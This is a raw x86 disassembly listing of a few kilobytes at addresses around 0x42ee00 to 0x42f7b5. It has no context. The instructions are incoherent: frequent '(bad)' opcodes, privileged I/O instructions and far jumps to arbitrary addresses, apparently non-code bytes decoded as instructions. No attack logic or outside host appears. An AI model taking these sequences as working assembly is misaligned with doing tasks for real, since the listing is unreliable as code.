  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp-0x20d85e]
  42ede5:	(bad)  
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	and    DWORD PTR [ecx+ecx*1+0xd21347b],0x43
  42edf6:	push   cs
  42edf7:	jge    0x42edd6
  42edf9:	ret    0xe350
  42edfc:	mov    ebp,0x108bba65
  42ee01:	jmp    0x6c1f0c4a
  42ee06:	jb     0x42ee7e
  42ee08:	adc    al,0x9b
  42ee0a:	pop    esp
  42ee0b:	imul   ebx,DWORD PTR [edi-0xd],0xffffffe2
  42ee0f:	lahf   
  42ee10:	sti    
  42ee11:	jne    0x42edda
  42ee13:	popa   
  42ee14:	dec    edi
  42ee15:	stc    
  42ee16:	sub    ebp,edi
  42ee18:	aas    
  42ee19:	sti    
  42ee1a:	mov    ch,0x6d
  42ee1c:	jg     0x42ee11
  42ee1e:	push   ebp
  42ee1f:	addr16 and ch,al
  42ee22:	add    al,BYTE PTR [edx]
  42ee24:	call   0x3fd5:0x4c0b1820
  42ee2b:	fucom  st(2)
  42ee2d:	das    
  42ee2e:	mov    DWORD PTR [ecx+0x3694f938],ebx
  42ee34:	pusha  
  42ee35:	gs add al,0x7f
  42ee38:	dec    esp
  42ee39:	nop
  42ee3a:	mov    ch,0xe6
  42ee3c:	fwait
  42ee3d:	or     BYTE PTR [ebx+0x7a],dh
  42ee40:	pminub mm6,QWORD PTR [ebp+0x5d]
  42ee44:	int    0x9
  42ee46:	jecxz  0x42edf8
  42ee48:	jns    0x42ede2
  42ee4a:	arpl   ax,si
  42ee4c:	mov    ds:0xa0f1a50c,al
  42ee51:	mov    ebx,0x2f17fe69
  42ee56:	cmp    BYTE PTR [esi+0x3b8af292],al
  42ee5c:	call   0x8e15:0xed166f1f
  42ee63:	clc    
  42ee64:	and    al,0x3b
  42ee66:	rcl    BYTE PTR [edx],0x30
  42ee69:	rcl    bh,cl
  42ee6b:	out    0xc8,eax
  42ee6d:	shl    BYTE PTR [ebp-0x618f45cd],0x6d
  42ee74:	pop    ds
  42ee75:	mov    ds:0x76be439a,eax
  42ee7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee7b:	mov    al,ds:0x59b03740
  42ee80:	adc    eax,0xfb926561
  42ee85:	mov    ch,0x4c
  42ee87:	xchg   ebx,eax
  42ee88:	push   eax
  42ee89:	and    eax,0x4d167cb0
  42ee8e:	and    eax,0xe9e276fb
  42ee93:	push   esi
  42ee94:	out    dx,al
  42ee95:	fwait
  42ee96:	call   0x8893:0x213448f6
  42ee9d:	mov    esi,0xc25aa2d3
  42eea2:	push   ebp
  42eea3:	ret    0x1de5
  42eea6:	nop
  42eea7:	jb     0x42eee7
  42eea9:	adc    DWORD PTR [eax-0x39d7b88b],0xb6b77b7a
  42eeb3:	push   eax
  42eeb4:	push   0x44b7c632
  42eeb9:	sbb    dl,BYTE PTR [edi+0x55]
  42eebc:	ror    cl,1
  42eebe:	daa    
  42eebf:	inc    ecx
  42eec0:	sub    eax,eax
  42eec2:	xchg   edi,eax
  42eec3:	push   esp
  42eec4:	jne    0x42ee63
  42eec6:	sub    esi,DWORD PTR [eax+0x11]
  42eec9:	mov    cl,0x4b
  42eecb:	mov    ebx,DWORD PTR [esi-0x25]
  42eece:	mov    dl,0xba
  42eed0:	adc    dl,ch
  42eed2:	push   esi
  42eed3:	clc    
  42eed4:	jp     0x42eeb5
  42eed6:	pop    ebx
  42eed7:	dec    esp
  42eed8:	imul   edi,DWORD PTR [ebp-0x77839f1e],0xffffffcb
  42eedf:	pop    esi
  42eee0:	stc    
  42eee1:	and    ebx,DWORD PTR [ebx+edx*2-0x4b9a7dbf]
  42eee8:	in     eax,0xd
  42eeea:	mov    esi,0x93d367
	...
  42ef53:	add    BYTE PTR [eax],al
  42ef55:	add    bl,al
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	jno    0x42ef6a
  42ef64:	xchg   ebx,eax
  42ef65:	shl    BYTE PTR [edi-0x9],cl
  42ef68:	add    DWORD PTR [eax],eax
  42ef6a:	add    BYTE PTR [ecx],al
  42ef6c:	add    BYTE PTR [eax],al
  42ef6e:	leave  
  42ef6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef70:	js     0x42efcf
  42ef72:	imul   esi,DWORD PTR [ecx-0x7a],0xbe63ff10
  42ef79:	mov    dh,0xbe
  42ef7b:	push   0x7d
  42ef7d:	pop    ss
  42ef7e:	add    DWORD PTR [ebx+edi*4+0xb7f3db6],0x19
  42ef86:	cmp    BYTE PTR [edi-0x2bd3b767],bl
  42ef8c:	sahf   
  42ef8d:	sub    eax,0xefa93083
  42ef92:	push   es
  42ef93:	add    al,0x93
  42ef95:	push   esi
  42ef96:	and    bh,BYTE PTR [esi]
  42ef98:	push   ebx
  42ef99:	inc    ebx
  42ef9a:	mov    eax,0xab7a4c99
  42ef9f:	or     cl,BYTE PTR [edi+0x5c]
  42efa2:	push   es
  42efa3:	and    ecx,esi
  42efa5:	stos   DWORD PTR es:[edi],eax
  42efa6:	adc    BYTE PTR [edi],0x40
  42efa9:	mov    ch,0x57
  42efab:	in     al,0x8c
  42efad:	lahf   
  42efae:	leave  
  42efaf:	inc    esp
  42efb0:	and    edi,DWORD PTR [edx]
  42efb2:	inc    esp
  42efb3:	add    DWORD PTR [edi-0x79],0x15
  42efb7:	pop    esp
  42efb8:	imul   edi,DWORD PTR [esi],0xffffff8e
  42efbb:	shld   DWORD PTR [edi],edx,cl
  42efbe:	inc    edi
  42efbf:	xchg   esi,eax
  42efc0:	push   ebx
  42efc1:	loopne 0x42f029
  42efc3:	rcr    al,1
  42efc5:	jecxz  0x42f005
  42efc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efc8:	push   edx
  42efc9:	or     DWORD PTR [ecx+0x1c],esi
  42efcc:	into   
  42efcd:	xchg   DWORD PTR ds:0xf75ef501,ecx
  42efd4:	sbb    al,0x6c
  42efd6:	or     bh,bl
  42efd8:	push   ss
  42efd9:	xchg   esp,eax
  42efda:	pop    ebp
  42efdb:	out    0xaf,al
  42efdd:	or     edi,DWORD PTR ds:0x152387a6
  42efe3:	dec    ecx
  42efe4:	idiv   dl
  42efe6:	mov    al,0x7d
  42efe8:	adc    BYTE PTR [esi-0x3c],bh
  42efeb:	pop    ss
  42efec:	in     eax,dx
  42efed:	jg     0x42efee
  42efef:	fbld   TBYTE PTR ds:0x12c54ab7
  42eff5:	sub    bl,al
  42eff7:	sbb    edx,DWORD PTR [edx]
  42eff9:	inc    eax
  42effa:	stos   BYTE PTR es:[edi],al
  42effb:	xchg   ecx,eax
  42effc:	adc    eax,0x9f1d9fa9
  42f001:	fisub  WORD PTR [esi+0x3e]
  42f004:	adc    edi,esi
  42f006:	pop    esp
  42f007:	out    dx,eax
  42f008:	out    0x69,eax
  42f00a:	mov    al,0xc2
  42f00c:	cmp    ebx,edx
  42f00e:	cs mov bh,0x6a
  42f011:	sub    ebx,DWORD PTR [ecx]
  42f013:	dec    edx
  42f014:	daa    
  42f015:	mov    WORD PTR [ebx],?
  42f017:	sub    DWORD PTR [edi+0x74],ecx
  42f01a:	push   eax
  42f01b:	sub    al,0x11
  42f01e:	sub    eax,DWORD PTR fs:[ebp-0x4e]
  42f022:	stos   BYTE PTR es:[edi],al
  42f023:	fmul   DWORD PTR [edx]
  42f025:	sbb    edx,DWORD PTR [eax+0x7e5aa8e7]
  42f02b:	sbb    al,0xbb
  42f02d:	mov    eax,0x886d34e
  42f032:	sub    esi,DWORD PTR [ecx+edi*2-0x34]
  42f036:	stc    
  42f037:	(bad)  
  42f039:	or     DWORD PTR [esi],esp
  42f03b:	cmp    eax,0x409d1450
  42f040:	mov    ah,0x11
  42f042:	outs   dx,DWORD PTR ds:[esi]
  42f043:	push   ss
  42f044:	mov    al,0x79
  42f046:	test   BYTE PTR [edx+0xe46e313],bl
  42f04c:	lea    edi,[si]
  42f04f:	adc    DWORD PTR [ecx-0x218476cd],ebp
  42f055:	pop    ebp
  42f056:	jl     0x42f0b5
  42f058:	int3   
  42f059:	push   0x4d
  42f05b:	test   al,0xdf
  42f05d:	jecxz  0x42f01a
  42f05f:	pop    ss
  42f060:	inc    ebp
  42f061:	(bad)  
  42f062:	clc    
  42f063:	inc    ebp
  42f064:	cwde   
  42f065:	and    DWORD PTR [ecx+ebx*4-0x4a1e7407],eax
  42f06c:	retf   
  42f06d:	mov    edi,0x0
	...
  42f0d6:	adc    bh,BYTE PTR [esi]
  42f0d8:	int    0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	jmp    0x67743e0b
  42f0e7:	clc    
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	jns    0x42f159
  42f0f0:	rcr    DWORD PTR [ecx+ebx*2-0x2d],cl
  42f0f4:	mov    bl,0x7b
  42f0f6:	int    0x8d
  42f0f8:	mov    al,0x62
  42f0fa:	(bad)  
  42f0fb:	jp     0x42f0d5
  42f0fd:	rol    DWORD PTR [edx+0x1ecf0366],cl
  42f103:	outs   dx,DWORD PTR ds:[esi]
  42f104:	jge    0x42f11a
  42f106:	cmp    al,0xdb
  42f108:	popf   
  42f109:	mov    BYTE PTR [ebp+0xacb67ea],0xe1
  42f110:	mov    ch,0x45
  42f112:	sbb    DWORD PTR [edx],ebp
  42f114:	mov    ds:0x29399f46,al
  42f119:	hlt    
  42f11a:	imul   ebp,DWORD PTR [eax],0xa884f427
  42f120:	fimul  DWORD PTR [ecx-0x39]
  42f123:	jae    0x42f0d5
  42f125:	mov    ch,0x2e
  42f127:	repnz push es
  42f129:	push   cs
  42f12a:	mov    eax,ds:0xd6bd952d
  42f12f:	and    ch,BYTE PTR [ebx+0x9c6d6a9]
  42f135:	addr16 mov ds:0x9529,al
  42f139:	ja     0x42f10b
  42f13b:	arpl   WORD PTR [edi-0x36],di
  42f13e:	(bad)  
  42f13f:	ficom  DWORD PTR [ebp+0x27]
  42f142:	jno    0x42f0d5
  42f144:	jbe    0x42f1c0
  42f146:	lods   al,BYTE PTR ds:[esi]
  42f147:	ja     0x42f0d2
  42f149:	das    
  42f14a:	or     bh,BYTE PTR [ebx+0x59]
  42f14d:	int3   
  42f14e:	pop    esp
  42f14f:	(bad)  
  42f151:	scas   eax,DWORD PTR es:[edi]
  42f152:	push   cs
  42f153:	gs retf 
  42f155:	retf   0x3bfe
  42f158:	outs   dx,DWORD PTR ds:[esi]
  42f159:	dec    ecx
  42f15a:	and    BYTE PTR [edi],cl
  42f15c:	rcr    ch,0xa8
  42f15f:	pusha  
  42f160:	push   cs
  42f161:	lods   eax,DWORD PTR ds:[esi]
  42f162:	gs adc eax,0x849968c5
  42f168:	sbb    DWORD PTR [ebx-0x6328c5d0],edi
  42f16e:	mul    ebx
  42f170:	and    BYTE PTR [ecx],0xe7
  42f173:	(bad)  
  42f174:	into   
  42f175:	jb     0x42f17d
  42f177:	out    0x7d,eax
  42f179:	xchg   DWORD PTR [ebx-0x2181b662],eax
  42f17f:	jge    0x42f1c0
  42f181:	inc    esp
  42f182:	jae    0x42f188
  42f184:	fwait
  42f185:	in     al,dx
  42f186:	popa   
  42f187:	rol    esp,0x48
  42f18a:	gs dec esi
  42f18c:	inc    esp
  42f18d:	jge    0x42f1d8
  42f18f:	or     eax,0xf38d124d
  42f194:	test   eax,0xd7d98456
  42f199:	in     eax,0xb2
  42f19b:	sbb    bh,dh
  42f19d:	(bad)  
  42f19e:	ss mov edi,0x9f2a3903
  42f1a4:	push   esi
  42f1a5:	retf   
  42f1a6:	dec    edi
  42f1a7:	clc    
  42f1a8:	xchg   ebp,eax
  42f1a9:	hlt    
  42f1aa:	ret    0x5210
  42f1ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1ae:	data16 fild QWORD PTR [ebx+ebx*4-0x4a9d005e]
  42f1b6:	sbb    DWORD PTR fs:[edi-0x20e83b73],esp
  42f1bd:	adc    BYTE PTR [edx-0x7bee6dc4],dl
  42f1c3:	pop    ebp
  42f1c4:	jg     0x42f1c4
  42f1c6:	test   cl,bl
  42f1c8:	sub    DWORD PTR [esi],esi
  42f1ca:	in     al,0x21
  42f1cc:	sub    ecx,DWORD PTR [esi+0x43]
  42f1cf:	fsub   DWORD PTR [ebx]
  42f1d1:	hlt    
  42f1d2:	xchg   ebp,eax
  42f1d3:	(bad)  
  42f1d5:	pusha  
  42f1d6:	mov    al,0x8a
  42f1d8:	mov    DWORD PTR [ecx+0x4082896f],ebp
  42f1de:	sub    DWORD PTR [edx+0x71ac03f3],0x50
  42f1e5:	pop    edx
  42f1e6:	cs push ds
  42f1e8:	xor    al,0xac
  42f1ea:	adc    dh,0xac
  42f1ed:	test   DWORD PTR [eax],eax
	...
  42f253:	add    BYTE PTR [eax],al
  42f255:	add    BYTE PTR [edx+0x26],bl
  42f258:	jecxz  0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	rol    DWORD PTR [ecx+0x59],0x8c
  42f266:	addr16 stc 
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	fs and eax,0x4cb66dc5
  42f274:	dec    ebp
  42f275:	mov    eax,ds:0x63fab321
  42f27a:	sub    BYTE PTR [ebx+0x1c5e2bdf],0x6
  42f281:	aaa    
  42f282:	add    DWORD PTR [ebx],eax
  42f284:	mov    ah,0x84
  42f286:	inc    ebx
  42f287:	jnp    0x42f21c
  42f289:	out    0x66,eax
  42f28b:	and    DWORD PTR [ebx],eax
  42f28d:	(bad)  
  42f28e:	dec    edx
  42f28f:	mov    dl,0xdb
  42f291:	daa    
  42f292:	or     edi,DWORD PTR [ecx-0x44f9a745]
  42f298:	stc    
  42f299:	shl    DWORD PTR [ecx-0x7b],cl
  42f29c:	stos   DWORD PTR es:[edi],eax
  42f29d:	jns    0x42f2c3
  42f29f:	(bad)  
  42f2a0:	mov    eax,ds:0xf61e1f6b
  42f2a5:	nop
  42f2a6:	lods   eax,DWORD PTR ds:[esi]
  42f2a7:	into   
  42f2a8:	sbb    eax,0xd29e1044
  42f2ad:	cdq    
  42f2ae:	sbb    ah,BYTE PTR [esi+0x43]
  42f2b1:	ret    0xc04
  42f2b4:	(bad)  
  42f2b5:	cld    
  42f2b6:	aaa    
  42f2b7:	cli    
  42f2b8:	pop    esp
  42f2b9:	xchg   ecx,eax
  42f2ba:	fcom   DWORD PTR [esi-0x2307867c]
  42f2c0:	push   0x66
  42f2c2:	add    al,0xab
  42f2c4:	cdq    
  42f2c5:	jp     0x42f326
  42f2c7:	mov    esp,0x559e1fb2
  42f2cc:	mov    cl,0xd1
  42f2ce:	(bad)  
  42f2cf:	dec    esi
  42f2d0:	je     0x42f2ba
  42f2d2:	imul   esp
  42f2d4:	or     DWORD PTR [ebx],ebx
  42f2d6:	iret   
  42f2d7:	icebp  
  42f2d8:	jle    0x42f357
  42f2da:	pop    esp
  42f2db:	mov    ecx,0x661a62ac
  42f2e0:	inc    eax
  42f2e1:	lahf   
  42f2e2:	mov    bh,BYTE PTR [eax-0x30]
  42f2e5:	cmp    eax,0x37a30c01
  42f2ea:	cs mov dh,0xda
  42f2ed:	int3   
  42f2ee:	push   cs
  42f2ef:	fcmovbe st,st(6)
  42f2f1:	sub    ah,BYTE PTR [esi-0x1b791441]
  42f2f7:	mov    cl,0xc7
  42f2f9:	call   0x58f5:0x8e191c25
  42f300:	xor    eax,0x1d3ae743
  42f305:	or     edx,DWORD PTR [edi+0x63]
  42f308:	xor    BYTE PTR [bp+si+0x15],dh
  42f30c:	(bad)  
  42f30d:	fmul   DWORD PTR [eax-0x21]
  42f310:	in     eax,0x6
  42f312:	jp     0x42f2a7
  42f314:	fidivr DWORD PTR [edx+0x50e3921c]
  42f31a:	hlt    
  42f31b:	ss pusha 
  42f31d:	lahf   
  42f31e:	fwait
  42f31f:	mov    esp,0xc2ef25d9
  42f324:	das    
  42f325:	pushf  
  42f326:	retf   
  42f327:	(bad)  
  42f328:	in     eax,dx
  42f329:	bound  ebx,QWORD PTR [esi+0x40]
  42f32c:	add    eax,0x674adf85
  42f331:	push   0xfffffffb
  42f333:	ss add al,0xfb
  42f336:	(bad)  
  42f338:	and    DWORD PTR [ebx],ebx
  42f33a:	adc    eax,0x44434b86
  42f33f:	je     0x42f381
  42f341:	aaa    
  42f342:	add    al,BYTE PTR [eax+0x4dbe5da3]
  42f348:	mov    ds:0x54467aa7,al
  42f34d:	(bad)  
  42f34e:	adc    ebp,DWORD PTR [eax+esi*2]
  42f351:	hlt    
  42f352:	ins    BYTE PTR es:[edi],dx
  42f353:	xchg   edx,eax
  42f354:	jmp    0xbe84:0xd39d73be
  42f35b:	push   ds
  42f35c:	aad    0xe9
  42f35e:	pop    esp
  42f35f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f360:	lds    esi,FWORD PTR [edx+0x6e55a882]
  42f366:	push   DWORD PTR [ecx*1+0x31cb9909]
  42f36d:	cwde   
	...
  42f3d6:	mov    ebp,0xaf8a081a
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	pop    ecx
  42f3e3:	or     DWORD PTR [esi],edx
  42f3e5:	clc    
  42f3e6:	addr16 cli 
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	(bad)  
  42f3ef:	stos   BYTE PTR es:[edi],al
  42f3f0:	cmp    al,0x2b
  42f3f2:	mov    esi,0x797f9316
  42f3f7:	pop    esi
  42f3f8:	or     ebx,edi
  42f3fa:	icebp  
  42f3fb:	ret    
  42f3fc:	dec    ebp
  42f3fd:	jnp    0x42f380
  42f3ff:	jmp    0x42f463
  42f401:	and    ebx,DWORD PTR [esp+edx*2+0x5]
  42f405:	mov    ebx,0x59f6464
  42f40a:	into   
  42f40b:	lods   eax,DWORD PTR ds:[esi]
  42f40c:	stc    
  42f40d:	push   esp
  42f40e:	or     ebp,ebp
  42f410:	js     0x42f482
  42f412:	ds push es
  42f414:	push   esi
  42f415:	sti    
  42f416:	mov    bh,0xff
  42f418:	lods   eax,DWORD PTR ds:[esi]
  42f419:	(bad)
  42f41d:	pop    esp
  42f41e:	lea    eax,[ecx+eax*8-0x4db7e112]
  42f425:	mov    al,0x48
  42f427:	dec    esp
  42f428:	and    ebx,DWORD PTR [esi+0x64]
  42f42b:	(bad)  
  42f42c:	out    dx,eax
  42f42d:	mov    ds:0x41be8090,eax
  42f432:	add    dh,ch
  42f434:	xor    dh,BYTE PTR [edx+edi*2-0x1b6fc748]
  42f43b:	or     al,0xdb
  42f43d:	dec    esi
  42f43e:	mov    esp,0x914990f0
  42f443:	push   ebx
  42f444:	enter  0x4505,0x11
  42f448:	xlat   BYTE PTR ds:[ebx]
  42f449:	mov    edx,DWORD PTR [ebx]
  42f44b:	mov    dl,BYTE PTR [ebx+0x1e]
  42f44e:	jne    0x42f4a0
  42f450:	mov    bl,0xef
  42f452:	xchg   ebp,ecx
  42f454:	mov    ecx,0x84143c0
  42f459:	ds inc ebp
  42f45b:	mov    bh,0x57
  42f45d:	test   BYTE PTR [ecx-0x2],bh
  42f460:	sbb    DWORD PTR [edx+0x420f1da3],esp
  42f466:	stos   BYTE PTR es:[edi],al
  42f467:	hlt    
  42f468:	pop    ss
  42f469:	loopne 0x42f4d9
  42f46b:	test   al,0x96
  42f46d:	dec    esi
  42f46e:	shr    BYTE PTR [edi],0xef
  42f471:	jecxz  0x42f4ef
  42f473:	sub    eax,0x26eaa426
  42f478:	adc    DWORD PTR [eax+ebp*1],0x4d594a3b
  42f47f:	mov    eax,0x4a0a2295
  42f484:	push   0xffffffee
  42f486:	adc    eax,0x6f7ca5e6
  42f48b:	adc    BYTE PTR [esp+ecx*2+0x1f6a6cf],dl
  42f492:	push   eax
  42f493:	in     eax,dx
  42f494:	pop    ebp
  42f495:	jne    0x42f451
  42f497:	adc    BYTE PTR [edi-0x26],dh
  42f49a:	cdq    
  42f49b:	sti    
  42f49c:	es ja  0x42f479
  42f49f:	jb     0x42f44a
  42f4a1:	inc    esi
  42f4a2:	push   cs
  42f4a3:	mov    esi,0x8103cd98
  42f4a8:	in     al,dx
  42f4a9:	and    esi,DWORD PTR [eax]
  42f4ab:	add    DWORD PTR [ebx+esi*4],ebx
  42f4ae:	jmp    0x3bb3:0xcf9820d3
  42f4b5:	enter  0x654,0xb5
  42f4b9:	imul   eax,DWORD PTR [edi+0x3ceea25c],0x5f
  42f4c0:	repz and BYTE PTR [ebx+0x58a9f21a],ah
  42f4c7:	gs lahf 
  42f4c9:	add    BYTE PTR [eax-0x10],ch
  42f4cc:	or     DWORD PTR [edi],0x1de955e3
  42f4d2:	shl    DWORD PTR [esi],0x1b
  42f4d5:	call   0x99814ddc
  42f4da:	arpl   WORD PTR [esi+0x59],ax
  42f4dd:	jmp    FWORD PTR [ecx]
  42f4df:	(bad)  
  42f4e0:	neg    BYTE PTR [edi-0xd]
  42f4e3:	pop    edi
  42f4e4:	(bad)  
  42f4e6:	mov    dh,0xbc
  42f4e8:	fwait
  42f4e9:	push   ebx
  42f4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f4eb:	inc    ebx
  42f4ec:	mov    ecx,DWORD PTR [esi]
	...
  42f556:	aaa    
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	test   ebx,ecx
  42f564:	clc    
  42f565:	das    
  42f566:	addr16 sti 
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	add    BYTE PTR [ecx],al
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	test   DWORD PTR ds:0xfd6978c6,ecx
  42f574:	(bad)  
  42f575:	push   ss
  42f576:	xor    DWORD PTR [ebp+0x59],edi
  42f579:	jnp    0x42f5a4
  42f57b:	adc    eax,0x68c1eb8b
  42f580:	ins    BYTE PTR es:[edi],dx
  42f581:	sub    BYTE PTR ds:0xec072944,cl
  42f587:	and    al,0x18
  42f589:	ror    DWORD PTR [eax-0x261d18ad],0xb1
  42f590:	out    0x8,al
  42f592:	popa   
  42f593:	test   eax,0xa41cd8bd
  42f598:	and    bh,BYTE PTR [edi+ecx*1+0x37]
  42f59c:	shl    ecx,1
  42f59e:	sub    esp,DWORD PTR [edx]
  42f5a0:	(bad)  
  42f5a1:	xchg   ecx,eax
  42f5a2:	and    ah,BYTE PTR [eax-0x13c2f8f6]
  42f5a8:	add    BYTE PTR [edi],bl
  42f5aa:	mov    dl,BYTE PTR [edx-0x42]
  42f5ad:	push   edx
  42f5ae:	je     0x42f60e
  42f5b0:	jns    0x42f57f
  42f5b2:	sbb    DWORD PTR [edx+esi*8-0x3f],edx
  42f5b6:	rol    DWORD PTR [edi],1
  42f5b8:	push   0xffffffac
  42f5ba:	and    al,0x70
  42f5bc:	retf   
  42f5bd:	and    al,0x7a
  42f5bf:	ins    WORD PTR es:[edi],dx
  42f5c1:	add    bl,bl
  42f5c3:	and    ebp,DWORD PTR [eax+0x763d3217]
  42f5c9:	jne    0x42f557
  42f5cb:	nop
  42f5cc:	test   DWORD PTR [edi],ebp
  42f5ce:	and    eax,0xc0e055a0
  42f5d3:	push   ecx
  42f5d4:	inc    eax
  42f5d5:	je     0x42f59f
  42f5d7:	or     DWORD PTR fs:[edi-0x3e],edi
  42f5db:	sti    
  42f5dc:	mov    cl,0xd6
  42f5de:	enter  0xe9df,0x37
  42f5e2:	rcr    DWORD PTR [edi],0xd3
  42f5e5:	cmp    edi,0x556c4a1a
  42f5eb:	fnstcw WORD PTR [esi]
  42f5ed:	mov    edx,0x6e424b58
  42f5f2:	pusha  
  42f5f3:	fadd   DWORD PTR [esp+ebp*8]
  42f5f6:	cmp    DWORD PTR [eiz*2+0x5ff79e46],eax
  42f5fd:	pop    esi
  42f5fe:	jl     0x42f665
  42f600:	mov    cl,0x6c
  42f602:	lock mov edx,0x17719997
  42f608:	rcr    ah,cl
  42f60a:	cmp    BYTE PTR [ecx],ch
  42f60c:	ss nop
  42f60e:	mov    bh,bl
  42f610:	cmp    dl,dh
  42f612:	fs pop es
  42f614:	xor    eax,0x8b59f021
  42f619:	dec    esi
  42f61a:	pop    eax
  42f61b:	std    
  42f61c:	mov    ah,0x7d
  42f61e:	aas    
  42f61f:	shl    DWORD PTR [edi+edi*2-0xa],0x27
  42f624:	pop    ebp
  42f625:	mov    ch,al
  42f627:	ins    DWORD PTR es:[edi],dx
  42f628:	mov    dl,0x8c
  42f62a:	mov    WORD PTR [esi+0x2a],cs
  42f62d:	jns    0x42f69d
  42f62f:	push   0x61a993c0
  42f634:	jg     0x42f64d
  42f636:	sub    eax,0x2df211b5
  42f63b:	push   esp
  42f63c:	js     0x42f646
  42f63e:	ins    DWORD PTR es:[edi],dx
  42f63f:	cmp    ecx,ebp
  42f641:	(bad)  
  42f642:	out    dx,al
  42f643:	mov    ebp,esi
  42f645:	push   edx
  42f646:	popf   
  42f647:	outs   dx,BYTE PTR ds:[esi]
  42f648:	rcr    BYTE PTR [ecx],1
  42f64a:	imul   esi,DWORD PTR [edx+0x7b],0x62
  42f64e:	push   edx
  42f64f:	lahf   
  42f650:	add    BYTE PTR [esi],0x46
  42f653:	lds    esp,FWORD PTR [eax-0x7be11644]
  42f659:	sbb    cl,BYTE PTR [eax-0x14]
  42f65c:	mov    edi,0x9f2a7b6
  42f661:	ret    
  42f662:	jp     0x42f616
  42f664:	mov    bh,0x28
  42f666:	cmp    DWORD PTR [esi-0x60958440],ebp
  42f66c:	fist   WORD PTR [eax]
	...
  42f6d6:	ds push esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	ins    BYTE PTR es:[edi],dx
  42f6e3:	mov    ch,0x73
  42f6e5:	sbb    eax,0x1fc67
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	dec    edx
  42f6ef:	xchg   ebx,eax
  42f6f0:	enter  0x66f8,0xaa
  42f6f4:	pop    esi
  42f6f5:	clc    
  42f6f6:	ret    
  42f6f7:	out    0xb1,al
  42f6f9:	jbe    0x42f760
  42f6fb:	sbb    BYTE PTR [edx+edx*8-0x568fcd65],dl
  42f702:	popf   
  42f703:	in     al,0x37
  42f705:	pusha  
  42f706:	mov    al,0x65
  42f708:	stc    
  42f709:	stos   BYTE PTR es:[edi],al
  42f70a:	cmp    ch,BYTE PTR [eax+0x32]
  42f70d:	and    al,0xdb
  42f70f:	dec    esp
  42f710:	mov    edi,0x300161d5
  42f715:	shl    eax,cl
  42f717:	jmp    0x5a5c:0x3dbbb051
  42f71e:	pop    edi
  42f71f:	stos   BYTE PTR es:[edi],al
  42f720:	ja     0x42f79c
  42f722:	push   ds
  42f723:	xchg   esp,eax
  42f724:	or     DWORD PTR [edx+eax*4],eax
  42f727:	inc    edi
  42f728:	and    eax,0x1a911e24
  42f72d:	pop    esi
  42f72e:	(bad)  
  42f72f:	pop    ebx
  42f730:	push   esp
  42f731:	adc    eax,DWORD PTR [edi-0x49b23b4e]
  42f737:	shr    BYTE PTR [edx],0x59
  42f73a:	jmp    0xba577d0a
  42f73f:	aas    
  42f740:	mov    ebx,0x4f4c90b7
  42f745:	ja     0x42f749
  42f747:	int3   
  42f748:	or     DWORD PTR [edx+0x56ad2d61],0x9284a29d
  42f752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f753:	shr    DWORD PTR [ebp-0x65],cl
  42f756:	xor    eax,0x81cb7c7d
  42f75b:	out    0x85,al
  42f75d:	pop    edx
  42f75e:	sub    edx,ebp
  42f760:	retf   
  42f761:	mov    BYTE PTR [esp+edx*1-0x3a],bh
  42f765:	cdq    
  42f766:	jp     0x42f733
  42f768:	adc    DWORD PTR [si+0xd60],ebx
  42f76d:	retf   
  42f76e:	and    esi,ebp
  42f770:	mov    al,ds:0x25b107c9
  42f775:	out    0x90,eax
  42f777:	retf   
  42f778:	fsin   
  42f77a:	mov    eax,0x9d358945
  42f77f:	lods   al,BYTE PTR ds:[esi]
  42f780:	jmp    0x42f704
  42f782:	xor    DWORD PTR ss:[edx+0x3e7757c7],0xffffffed
  42f78a:	dec    ebp
  42f78b:	add    DWORD PTR [edx],edx
  42f78d:	sub    al,0xaf
  42f78f:	leave  
  42f790:	nop
  42f791:	aas    
  42f792:	jno    0x42f795
  42f794:	call   0x16324915
  42f799:	sub    DWORD PTR [ecx-0x66],esp
  42f79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f79d:	arpl   WORD PTR [edi],dx
  42f79f:	mov    bh,0xc9
  42f7a1:	mov    eax,0x6c81f226
  42f7a6:	es mov edx,0x14f82f1a
  42f7ac:	jmp    0xeeeb9ca3
  42f7b1:	stc    
  42f7b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f7b3:	(bad)  
  42f7b4:	xchg   edx,eax
  42f7b5:	xchg   ecx,eax
